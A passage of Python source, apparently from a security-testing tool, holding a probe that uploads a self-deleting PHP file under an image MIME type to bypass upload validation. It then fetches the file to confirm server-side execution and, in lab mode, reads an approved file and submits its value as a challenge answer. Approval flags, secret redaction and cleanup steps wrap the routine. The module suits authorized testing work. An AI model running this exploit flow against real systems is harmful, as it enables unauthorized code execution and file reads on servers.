                "expectedStatusStatus": {
                    "type": "integer",
                    "minimum": 200,
                    "maximum": 299,
                },
                "expectedSolutionStatus": {
                    "type": "integer",
                    "minimum": 200,
                    "maximum": 299,
                },
                "expectedSolvedStatus": {
                    "type": "integer",
                    "minimum": 200,
                    "maximum": 299,
                },
                "approvedReadPath": {"type": "string"},
                "engagement": {
                    "type": "string",
                    "enum": sorted(ALLOWED_ENGAGEMENTS),
                },
                "allowUnsafeMethods": {"type": "boolean", "default": False},
                "fileUploadApproved": {"type": "boolean", "default": False},
                "serverSideExecutionApproved": {"type": "boolean", "default": False},
                "stateChangeApproved": {"type": "boolean", "default": False},
                "selfCleanupApproved": {"type": "boolean", "default": False},
                "sensitiveFileReadApproved": {"type": "boolean", "default": False},
                "solutionSubmitApproved": {"type": "boolean", "default": False},
                "timeoutSeconds": {"type": "integer", "minimum": 3, "maximum": 30},
                "authCookies": {
                    "type": "string",
                    "x-hidden": True,
                    "x-workflow-owned": True,
                },
                "cookie": {
                    "type": "string",
                    "x-hidden": True,
                    "x-workflow-owned": True,
                },
                "authHeaders": {
                    "type": "object",
                    "additionalProperties": False,
                    "properties": {
                        "Authorization": {
                            "type": "string",
                            "minLength": 3,
                            "maxLength": MAX_COOKIE_CHARS,
                        }
                    },
                    "required": ["Authorization"],
                    "x-hidden": True,
                    "x-workflow-owned": True,
                },
            },
            "required": [
                "mode",
                "proofLevel",
                "uploadFormPath",
                "uploadPath",
                "servePathTemplate",
                "fileField",
                "expectedFormStatus",
                "expectedControlUploadStatus",
                "expectedControlRejectionMarker",
                "expectedAbsenceStatus",
                "expectedAbsenceMarker",
                "expectedAttackUploadStatus",
                "expectedAttackAcceptanceMarker",
                "expectedExecutionStatus",
                "expectedCleanupStatus",
                "engagement",
                "allowUnsafeMethods",
                "fileUploadApproved",
                "serverSideExecutionApproved",
                "stateChangeApproved",
                "selfCleanupApproved",
            ],
            "oneOf": [{"required": ["target"]}, {"required": ["url"]}],
            "allOf": [
                {
                    "if": {
                        "properties": {
                            "proofLevel": {"const": "lab-state-change"},
                        }
                    },
                    "then": {"required": lab_fields},
                    "else": {
                        "not": {
                            "anyOf": [{"required": [field]} for field in lab_fields]
                        }
                    },
                },
                {
                    "if": {
                        "properties": {
                            "expectedAttackUploadStatus": {
                                "minimum": 300,
                                "maximum": 399,
                            }
                        }
                    },
                    "then": {"required": ["expectedAttackUploadLocation"]},
                    "else": {"not": {"required": ["expectedAttackUploadLocation"]}},
                },
            ],
        }

    @property
    def metadata(self) -> Dict[str, Any]:
        return {
            "category": "exploit-test",
            "phase": 4,
            "domain": ["web"],
            "input_type": ["url", "authenticated-session", "multipart", "workflow"],
            "output_type": ["findings", "file_upload_proof"],
            "taxonomy_domain": ["web"],
            "lifecycle_phase": "exploit-test",
            "purpose_count": "single",
            "primary_purpose": (
                "Confirm PHP execution through multipart Content-Type validation bypass"
            ),
            "secondary_purposes": [],
        }

    async def _request(
        self,
        session: aiohttp.ClientSession,
        method: str,
        url: str,
        cookie: str = "",
        body: bytes = b"",
        content_type: str = "",
        authorization: str = "",
    ) -> Dict[str, Any]:
        headers = {
            "User-Agent": USER_AGENT,
            "Accept": ACCEPT,
        }
        if cookie:
            headers["Cookie"] = cookie
        if authorization:
            headers["Authorization"] = authorization
        if body:
            headers["Content-Type"] = content_type
        async with session.request(
            method,
            url,
            headers=headers,
            data=body if body else None,
            allow_redirects=False,
            ssl=True,
        ) as response:
            raw = await read_limited(response.content, MAX_RESPONSE_BYTES + 1)
            truncated = len(raw) > MAX_RESPONSE_BYTES
            raw = raw[:MAX_RESPONSE_BYTES]
            return {
                "status": response.status,
                "reason": str(response.reason or "")[:100],
                "headers": response.headers,
                "body": raw.decode("utf-8", errors="replace").replace("\0", ""),
                "truncated": truncated,
                "redirected": bool(response.history),
            }

    @staticmethod
    def _append_evidence(
        evidence_steps: List[Dict[str, Any]],
        label: str,
        method: str,
        url: str,
        cookie: str,
        body: bytes,
        content_type: str,
        response: Dict[str, Any],
        secret_values: Iterable[Any],
        authorization: str = "",
    ) -> None:
        step = build_http_evidence_step(
            label,
            method,
            url,
            cookie,
            body,
            content_type,
            response,
            secret_values,
            authorization,
        )
        if step["responseExcerptTruncated"]:
            raise FileUploadProbeError(f"{label} evidence was truncated")
        evidence_steps.append(step)

    async def _attempt_failure_cleanup(
        self,
        serve_url: str,
        cookie: str,
        authorization: str,
        request_timeout: float,
        expected_cleanup_status: int,
        absence_marker: str,
        payload_source: str,
        expected_marker: str,
    ) -> bool:
        """Trigger self-delete and obtain an absence receipt without making findings."""
        try:
            cleanup_timeout = aiohttp.ClientTimeout(
                total=request_timeout,
                connect=min(request_timeout, 8),
            )
            async with aiohttp.ClientSession(
                timeout=cleanup_timeout,
                cookie_jar=aiohttp.DummyCookieJar(),
            ) as cleanup_session:
                # The first GET executes the tool-owned self-delete payload if
                # either upload was accepted. The second GET is the receipt.
                await self._request(
                    cleanup_session,
                    "GET",
                    serve_url,
                    cookie,
                    authorization=authorization,
                )
                cleanup_receipt = await self._request(
                    cleanup_session,
                    "GET",
                    serve_url,
                    cookie,
                    authorization=authorization,
                )
            receipt_body = _response_body(cleanup_receipt)
            return (
                not cleanup_receipt.get("redirected")
                and not cleanup_receipt.get("truncated")
                and int(cleanup_receipt.get("status") or 0)
                == expected_cleanup_status
                and absence_marker in receipt_body
                and payload_source not in receipt_body
                and expected_marker not in receipt_body
            )
        except Exception:
            return False

    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        valid, reason = validate_probe_parameters(parameters)
        if not valid:
            return {
                "success": False,
                "fallback": False,
                "error": reason,
                "findings": [],
                "createdArtifacts": 0,
                "cleanupAvailable": True,
                "cleanupAttempted": False,
                "remainingArtifacts": 0,
            }

        target = _origin_target(parameters.get("target") or parameters.get("url"))
        cookie, _ = _validated_cookie(parameters)
        authorization, _ = _validated_authorization(parameters)
        assert target is not None and cookie is not None and authorization is not None
        mode = str(parameters["mode"]).lower()
        proof_level = str(parameters["proofLevel"]).lower()
        engagement = str(parameters["engagement"]).lower()
        upload_form_path = str(parameters["uploadFormPath"])
        upload_path = str(parameters["uploadPath"])
        serve_template = str(parameters["servePathTemplate"])
        file_field = str(parameters["fileField"])
        timeout = _request_timeout_seconds(parameters)

        expected_form_status = int(parameters["expectedFormStatus"])
        expected_control_status = int(parameters["expectedControlUploadStatus"])
        expected_absence_status = int(parameters["expectedAbsenceStatus"])
        expected_upload_status = int(parameters["expectedAttackUploadStatus"])
        expected_execution_status = int(parameters["expectedExecutionStatus"])
        expected_cleanup_status = int(parameters["expectedCleanupStatus"])
        control_rejected_marker = str(parameters["expectedControlRejectionMarker"])
        absence_marker = str(parameters["expectedAbsenceMarker"])
        upload_accepted_marker = str(parameters["expectedAttackAcceptanceMarker"])

        nonce = secrets.token_hex(16)
        filename = f"xasm-upload-{nonce}.php"
        boundary = f"xasm{nonce}"
        approved_read_path = (
            str(parameters["approvedReadPath"])
            if proof_level == "lab-state-change"
            else None
        )
        payload = build_php_payload(nonce, approved_read_path)
        payload_source = str(payload["source"])
        payload_bytes = payload_source.encode("utf-8")
        serve_path = serve_template.replace("{filename}", filename)

        upload_form_url = urljoin(target, upload_form_path)
        expected_upload_url = urljoin(target, upload_path)
        serve_url = urljoin(target, serve_path)

        request_count = 0
        baseline_requests = 0
        form_requests = 0
        control_upload_requests = 0
        absence_requests = 0
        attack_upload_requests = 0
        execution_requests = 0
        cleanup_requests = 0
        solution_requests = 0
        solved_checks = 0
        created_artifacts = 0
        cleanup_attempted = False
        upload_post_sent = False
        evidence_steps: List[Dict[str, Any]] = []
        csrf_proof: List[Dict[str, Any]] = []
        secret_values: List[Any] = [cookie]
        if authorization:
            secret_values.append(authorization)
        if approved_read_path:
            secret_values.append(approved_read_path)

        control_form_status = 0
        control_status = 0
        control_absence_status = 0
        attack_form_status = 0
        attack_upload_status = 0
        execution_status = 0
        cleanup_status = 0
        baseline_status: Optional[int] = None
        solution_status: Optional[int] = None
        solved_status: Optional[int] = None
        extracted_value: Optional[str] = None
        control_file_part = b""
        attack_file_part = b""

        timeout_config = aiohttp.ClientTimeout(total=timeout, connect=min(timeout, 8))
        try:
            async with aiohttp.ClientSession(
                timeout=timeout_config,
                cookie_jar=aiohttp.DummyCookieJar(),
            ) as session:
                if proof_level == "lab-state-change":
                    status_url = urljoin(target, str(parameters["statusPath"]))
                    baseline = await self._request(
                        session,
                        "GET",
                        status_url,
                        "",
                    )
                    request_count += 1
                    baseline_requests += 1
                    solved_checks += 1
                    baseline_status = int(baseline.get("status") or 0)
                    baseline_body = _assert_common_response(
                        baseline,
                        int(parameters["expectedStatusStatus"]),
                        "unsolved baseline",
                    )
                    if (
                        str(parameters["unsolvedMarker"]) not in baseline_body
                        or str(parameters["solvedMarker"]) in baseline_body
                    ):
                        raise FileUploadProbeError(
                            "unsolved baseline did not prove a fresh unsolved state"
                        )
                    self._append_evidence(
                        evidence_steps,
                        "unsolved-baseline",
                        "GET",
                        status_url,
                        "",
                        b"",
                        "",
                        baseline,
                        secret_values,
                    )

                control_form_response = await self._request(
                    session,
                    "GET",
                    upload_form_url,
                    cookie,
                    authorization=authorization,
                )
                request_count += 1
                form_requests += 1
                control_form_status = int(control_form_response.get("status") or 0)
                control_form_body = _assert_common_response(
                    control_form_response,
                    expected_form_status,
                    "control upload form",
                )
                control_form = parse_upload_form(
                    control_form_body,
                    upload_form_url,
                    target,
                    upload_path,
                    file_field,
                )
                control_csrf_name, control_csrf_value = control_form["csrfField"]
                for _, hidden_value in control_form["hiddenFields"]:
                    if hidden_value:
                        secret_values.append(hidden_value)
                csrf_proof.append(
                    {
                        "stepLabel": "upload-form-control",
                        "fieldName": control_csrf_name,
                        "sha256": _sha256_text(control_csrf_value),
                        "length": len(control_csrf_value.encode("utf-8")),
                    }
                )
                self._append_evidence(
                    evidence_steps,
                    "upload-form-control",
                    "GET",
                    upload_form_url,
                    cookie,
                    b"",
                    "",
                    control_form_response,
                    secret_values,
                    authorization,
                )

                control_body, control_file_part = build_multipart_body(
                    boundary,
                    control_form["hiddenFields"],
                    file_field,
                    filename,
                    CONTROL_MIME,
                    payload_bytes,
                )
                multipart_content_type = f"multipart/form-data; boundary={boundary}"
                upload_post_sent = True
                control_response = await self._request(
                    session,
                    "POST",
                    expected_upload_url,
                    cookie,
                    control_body,
                    multipart_content_type,
                    authorization,
                )
                request_count += 1
                control_upload_requests += 1
                control_status = int(control_response.get("status") or 0)
                control_response_body = _assert_common_response(
                    control_response,
                    expected_control_status,
                    "disallowed MIME control upload",
                )
                if (
                    control_rejected_marker not in control_response_body
                    or upload_accepted_marker in control_response_body
                ):
                    raise FileUploadProbeError(
                        "disallowed MIME control did not prove exact rejection"
                    )
                _assert_no_source_or_marker(
                    control_response_body,
                    payload_source,
                    [str(payload["expectedMarker"])],
                )
                self._append_evidence(
                    evidence_steps,
                    "disallowed-mime-control-upload",
                    "POST",
                    expected_upload_url,
                    cookie,
                    control_body,
                    multipart_content_type,
                    control_response,
                    secret_values,
                    authorization,
                )

                control_absence = await self._request(
                    session,
                    "GET",
                    serve_url,
                    "",
                )
                request_count += 1
                absence_requests += 1
                control_absence_status = int(control_absence.get("status") or 0)
                control_absence_body = _assert_common_response(
                    control_absence,
                    expected_absence_status,
                    "control artifact absence",
                )
                if absence_marker not in control_absence_body:
                    raise FileUploadProbeError(
                        "control artifact absence marker was not present"
                    )
                _assert_no_source_or_marker(
                    control_absence_body,
                    payload_source,
                    [str(payload["expectedMarker"])],
                )
                self._append_evidence(
                    evidence_steps,
                    "control-artifact-absence",
                    "GET",
                    serve_url,
                    "",
                    b"",
                    "",
                    control_absence,
                    secret_values,
                )

                attack_form_response = await self._request(
                    session,
                    "GET",
                    upload_form_url,
                    cookie,
                    authorization=authorization,
                )
                request_count += 1
                form_requests += 1
                attack_form_status = int(attack_form_response.get("status") or 0)
                attack_form_body = _assert_common_response(
                    attack_form_response,
                    expected_form_status,
                    "attack upload form",
                )
                attack_form = parse_upload_form(
                    attack_form_body,
                    upload_form_url,
                    target,
                    upload_path,
                    file_field,
                )
                attack_csrf_name, attack_csrf_value = attack_form["csrfField"]
                for _, hidden_value in attack_form["hiddenFields"]:
                    if hidden_value:
                        secret_values.append(hidden_value)
                csrf_proof.append(
                    {
                        "stepLabel": "upload-form-attack",
                        "fieldName": attack_csrf_name,
                        "sha256": _sha256_text(attack_csrf_value),
                        "length": len(attack_csrf_value.encode("utf-8")),
                    }
                )
                self._append_evidence(
                    evidence_steps,
                    "upload-form-attack",
                    "GET",
                    upload_form_url,
                    cookie,
                    b"",
                    "",
                    attack_form_response,
                    secret_values,
                    authorization,
                )

                attack_body, attack_file_part = build_multipart_body(
                    boundary,
                    attack_form["hiddenFields"],
                    file_field,
                    filename,
                    ATTACK_MIME,
                    payload_bytes,
                )
                control_canonical = _canonical_file_part(control_file_part)
                attack_canonical = _canonical_file_part(attack_file_part)
                if (
                    control_canonical != attack_canonical
                    or CONTROL_MIME.encode("ascii") not in control_file_part
                    or ATTACK_MIME.encode("ascii") not in attack_file_part
                ):
                    raise FileUploadProbeError(
                        "control and attack file parts drifted beyond the MIME leaf"
                    )

                upload_post_sent = True
                attack_response = await self._request(
                    session,
                    "POST",
                    expected_upload_url,
                    cookie,
                    attack_body,
                    multipart_content_type,
                    authorization,
                )
                request_count += 1
                attack_upload_requests += 1
                attack_upload_status = int(attack_response.get("status") or 0)
                attack_response_body = _assert_common_response(
                    attack_response,
                    expected_upload_status,
                    "image MIME attack upload",
                    allow_configured_redirect=300 <= expected_upload_status <= 399,
                )
                if (
                    upload_accepted_marker not in attack_response_body
                    or control_rejected_marker in attack_response_body
                ):
                    raise FileUploadProbeError(
                        "image MIME attack did not prove exact upload acceptance"
                    )
                if 300 <= expected_upload_status <= 399:
                    location = _response_location(attack_response)
                    expected_location = str(parameters["expectedAttackUploadLocation"])
                    if (
                        location != expected_location
                        or not _strict_relative_path(location)
                        or not _same_origin(target, urljoin(target, location))
                    ):
                        raise FileUploadProbeError(
                            "upload redirect did not equal the configured same-origin Location"
                        )
                _assert_no_source_or_marker(
                    attack_response_body,
                    payload_source,
                    [str(payload["expectedMarker"])],
                )
                created_artifacts = 1
                self._append_evidence(
                    evidence_steps,
                    "image-mime-attack-upload",
                    "POST",
                    expected_upload_url,
                    cookie,
                    attack_body,
                    multipart_content_type,
                    attack_response,
                    secret_values,
                    authorization,
                )

                execution_response = await self._request(
                    session,
                    "GET",
                    serve_url,
                    "",
                )
                request_count += 1
                execution_requests += 1
                cleanup_attempted = True
                execution_status = int(execution_response.get("status") or 0)
                execution_body = _assert_common_response(
                    execution_response,
                    expected_execution_status,
                    "uploaded PHP execution",
                )
                extracted_value = _parse_exact_execution(
                    execution_body,
                    payload,
                    proof_level,
                )
                if extracted_value is not None:
                    secret_values.append(extracted_value)
                execution_label = (
                    "executed-marker-fetch"
                    if proof_level == "runtime-execution"
                    else "scoped-secret-execution-fetch"
                )
                self._append_evidence(
                    evidence_steps,
                    execution_label,
                    "GET",
                    serve_url,
                    "",
                    b"",
                    "",
                    execution_response,
                    secret_values,
                )

                cleanup_response = await self._request(
                    session,
                    "GET",
                    serve_url,
                    "",
                )
                request_count += 1
                cleanup_requests += 1
                cleanup_status = int(cleanup_response.get("status") or 0)
                cleanup_body = _assert_common_response(
                    cleanup_response,
                    expected_cleanup_status,
                    "uploaded artifact cleanup confirmation",
                )
                if absence_marker not in cleanup_body:
                    raise FileUploadProbeError(
                        "cleanup confirmation did not contain the exact absence marker"
                    )
                _assert_no_source_or_marker(
                    cleanup_body,
                    payload_source,
                    [str(payload["expectedMarker"])],
                )
                self._append_evidence(
                    evidence_steps,
                    "cleanup-confirmation",
                    "GET",
                    serve_url,
                    "",
                    b"",
                    "",
                    cleanup_response,
                    secret_values,
                )

                if proof_level == "lab-state-change":
                    assert extracted_value is not None
                    solution_url = urljoin(target, str(parameters["solutionPath"]))
                    solution_body = urlencode([("answer", extracted_value)]).encode("utf-8")
                    solution_response = await self._request(
                        session,
                        "POST",
                        solution_url,
                        "",
                        solution_body,
                        "application/x-www-form-urlencoded",
                    )
                    request_count += 1
                    solution_requests += 1
                    solution_status = int(solution_response.get("status") or 0)
                    solution_response_body = _assert_common_response(
                        solution_response,
                        int(parameters["expectedSolutionStatus"]),
                        "approved solution submission",
                    )
                    if not _parse_solution_success(solution_response_body):
                        raise FileUploadProbeError(
                            "solution response did not confirm the submitted value"
                        )
                    self._append_evidence(
                        evidence_steps,
                        "approved-solution-submit",
                        "POST",
                        solution_url,
                        "",
                        solution_body,
                        "application/x-www-form-urlencoded",
                        solution_response,
                        secret_values,
                    )

                    status_url = urljoin(target, str(parameters["statusPath"]))
                    solved_response = await self._request(
                        session,
                        "GET",
                        status_url,
                        "",
                    )
                    request_count += 1
                    solved_checks += 1
                    solved_status = int(solved_response.get("status") or 0)
                    solved_body = _assert_common_response(
                        solved_response,
                        int(parameters["expectedSolvedStatus"]),
                        "solved confirmation",
                    )
                    if (
                        str(parameters["solvedMarker"]) not in solved_body
                        or str(parameters["unsolvedMarker"]) in solved_body
                    ):
                        raise FileUploadProbeError(
                            "final status did not prove an unsolved-to-solved transition"
                        )
                    self._append_evidence(
                        evidence_steps,
                        "solved-confirmation",
                        "GET",
                        status_url,
                        "",
                        b"",
                        "",
                        solved_response,
                        secret_values,
                    )

            expected_labels = (
                EXPECTED_RUNTIME_STEP_LABELS
                if proof_level == "runtime-execution"
                else EXPECTED_LAB_STEP_LABELS
            )
            expected_request_count = 7 if proof_level == "runtime-execution" else 10
            if (
                request_count != expected_request_count
                or tuple(step["label"] for step in evidence_steps) != expected_labels
                or any(step["responseExcerptTruncated"] for step in evidence_steps)
            ):
                raise FileUploadProbeError(
                    "proof did not preserve the exact ordered Request/Response contract"
                )

            canonical_part = _canonical_file_part(control_file_part)
            payload_proof: Dict[str, Any] = {
                "sha256": _sha256_bytes(payload_bytes),
                "length": len(payload_bytes),
                "expectedMarker": str(payload["expectedMarker"]),
                "selfDeleting": True,
            }

            verification: Dict[str, Any] = {
                "verified": True,
                "fallback": False,
                "mode": mode,
                "proofLevel": proof_level,
                "target": target,
                "uploadFormPath": upload_form_path,
                "uploadPath": upload_path,
                "servePathTemplate": serve_template,
                "fileField": file_field,
                "engagement": engagement,
                "allowUnsafeMethods": True,
                "fileUploadApproved": True,
                "serverSideExecutionApproved": True,
                "stateChangeApproved": True,
                "selfCleanupApproved": True,
                "redirectsFollowed": False,
                "authenticated": True,
                "formActionValidated": True,
                "singleFormMatched": True,
                "singleFileFieldMatched": True,
                "freshFormRequests": 2,
                "controlRejected": True,
                "controlArtifactAbsent": True,
                "attackAccepted": True,
                "mimeOnlyDifferential": True,
                "phpExecuted": True,
                "sourceDisclosureRejected": True,
                "cleanupVerified": True,
                "secretMaterialRedacted": True,
                "createdArtifacts": 1,
                "remainingArtifacts": 0,
                "requestCount": request_count,
                "baselineRequests": baseline_requests,
                "formRequests": form_requests,
                "controlUploadRequests": control_upload_requests,
                "absenceRequests": absence_requests,
                "attackUploadRequests": attack_upload_requests,
                "executionRequests": execution_requests,
                "cleanupRequests": cleanup_requests,
                "solutionRequests": solution_requests,
                "solvedChecks": solved_checks,
                "expectedFormStatus": expected_form_status,
                "expectedControlUploadStatus": expected_control_status,
                "expectedAbsenceStatus": expected_absence_status,
                "expectedAttackUploadStatus": expected_upload_status,
                "expectedExecutionStatus": expected_execution_status,
                "expectedCleanupStatus": expected_cleanup_status,
                "expectedControlRejectionMarker": control_rejected_marker,
                "expectedAbsenceMarker": absence_marker,
                "expectedAttackAcceptanceMarker": upload_accepted_marker,
                "controlFormStatus": control_form_status,
                "controlUploadStatus": control_status,
                "controlAbsenceStatus": control_absence_status,
                "attackFormStatus": attack_form_status,
                "attackUploadStatus": attack_upload_status,
                "executionStatus": execution_status,
                "cleanupStatus": cleanup_status,
                "nonce": nonce,
                "filename": filename,
                "payloadProof": payload_proof,
                "multipartProof": {
                    "filenameSha256": _sha256_text(filename),
                    "filenameLength": len(filename.encode("utf-8")),
                    "payloadSha256": _sha256_bytes(payload_bytes),
                    "payloadLength": len(payload_bytes),
                    "controlFilePartSha256": _sha256_bytes(control_file_part),
                    "attackFilePartSha256": _sha256_bytes(attack_file_part),
                    "canonicalFilePartSha256": _sha256_bytes(canonical_part),
                    "controlMime": CONTROL_MIME,
                    "attackMime": ATTACK_MIME,
                    "changedLeafCount": 1,
                    "changedLeaf": "filePartContentType",
                },
                "sessionProof": {
                    "sha256": _sha256_text(cookie),
                    "length": len(cookie.encode("utf-8")),
                    "cookieCount": len(
                        [part for part in cookie.split(";") if part.strip()]
                    ),
                },
                "csrfProof": csrf_proof,
                "httpEvidence": {"version": 1, "steps": evidence_steps},
            }
            if authorization:
                verification["sessionProof"]["authorizationSha256"] = _sha256_text(
                    authorization
                )
                verification["sessionProof"]["authorizationLength"] = len(
                    authorization.encode("utf-8")
                )
            if proof_level == "lab-state-change":
                assert approved_read_path is not None and extracted_value is not None
                verification.update(
                    {
                        "expectedStatusStatus": int(parameters["expectedStatusStatus"]),
                        "expectedSolutionStatus": int(
                            parameters["expectedSolutionStatus"]
                        ),
                        "expectedSolvedStatus": int(parameters["expectedSolvedStatus"]),
                        "statusPath": str(parameters["statusPath"]),
                        "solutionPath": str(parameters["solutionPath"]),
                        "baselineStatus": baseline_status,
                        "solutionStatus": solution_status,
                        "solvedStatus": solved_status,
                        "sensitiveFileReadApproved": True,
                        "solutionSubmitApproved": True,
                        "solvedBefore": False,
                        "effectTriggered": True,
                        "solvedAfter": True,
                        "unsolvedMarker": str(parameters["unsolvedMarker"]),
                        "solvedMarker": str(parameters["solvedMarker"]),
                        "approvedReadPathSha256": _sha256_text(approved_read_path),
                        "approvedReadPathLength": len(
                            approved_read_path.encode("utf-8")
                        ),
                        "readValueSha256": _sha256_text(extracted_value),
                        "readValueLength": len(extracted_value.encode("utf-8")),
                        "submittedAnswerSha256": _sha256_text(extracted_value),
                        "submittedAnswerLength": len(extracted_value.encode("utf-8")),
                    }
                )
            if 300 <= expected_upload_status <= 399:
                verification["expectedAttackUploadLocation"] = str(
                    parameters["expectedAttackUploadLocation"]
                )

            serialized_verification = json.dumps(
                verification,
                ensure_ascii=False,
                sort_keys=True,
            )
            for secret in secret_values:
                if secret and str(secret) in serialized_verification:
                    raise FileUploadProbeError(
                        "verification retained raw session, CSRF, path, or read material"
                    )
            if REDACTED_RUNTIME_SECRET not in serialized_verification:
                raise FileUploadProbeError(
                    "verification did not retain inspectable redaction receipts"
                )

            finding = build_nuclei_finding(target, verification)
            return {
                "success": True,
                "fallback": False,
                "tool": self.name,
                "target": target,
                "requestCount": request_count,
                "verification": verification,
                "findings": [finding],
                "createdArtifacts": 1,
                "cleanupAvailable": True,
                "cleanupAttempted": True,
                "remainingArtifacts": 0,
                "summary": {
                    "verified": True,
                    "mode": mode,
                    "proofLevel": proof_level,
                    "requests": request_count,
                    "findings": 1,
                    "cleanupVerified": True,
                },
            }
        except asyncio.CancelledError:
            # asyncio.wait_for cancels the task with BaseException semantics.
            # Once any upload POST may have reached the server, protect the
            # bounded two-GET self-delete/receipt sequence before propagating
            # cancellation. No finding can be produced on this path.
            if upload_post_sent:
                cleanup_attempted = True
                created_artifacts = max(created_artifacts, 1)
                cleanup_deadline = timeout * FAILURE_CLEANUP_REQUESTS
                try:
                    await asyncio.shield(
                        asyncio.wait_for(
                            self._attempt_failure_cleanup(
                                serve_url,
                                cookie,
                                authorization,
                                timeout,
                                expected_cleanup_status,
                                absence_marker,
                                payload_source,
                                str(payload["expectedMarker"]),
                            ),
                            timeout=cleanup_deadline,
                        )
                    )
                except asyncio.CancelledError:
                    # A repeated cancellation still must not be converted into
                    # success or a finding. The shielded cleanup remains bounded.
                    pass
                except Exception:
                    pass
            raise
        except Exception as exc:
            safe_error = _sanitize_http_text(
                str(exc) or exc.__class__.__name__,
                secret_values,
                500,
            )
            cleanup_verified_on_failure = False
            remaining_artifacts = 1 if upload_post_sent else 0
            if upload_post_sent:
                cleanup_attempted = True
                created_artifacts = max(created_artifacts, 1)
                cleanup_verified_on_failure = await self._attempt_failure_cleanup(
                    serve_url,
                    cookie,
                    authorization,
                    timeout,
                    expected_cleanup_status,
                    absence_marker,
                    payload_source,
                    str(payload["expectedMarker"]),
                )
                if cleanup_verified_on_failure:
                    remaining_artifacts = 0
                else:
                    remaining_artifacts = 1
            residual = remaining_artifacts > 0
            return {
                "success": False,
                "fallback": False,
                "error": safe_error,
                "findings": [],
                "createdArtifacts": created_artifacts,
                "cleanupAvailable": True,
                "cleanupAttempted": cleanup_attempted,
                "cleanupVerifiedOnFailure": cleanup_verified_on_failure,
                "remainingArtifacts": remaining_artifacts,
                "residualArtifactWarning": residual,
            }
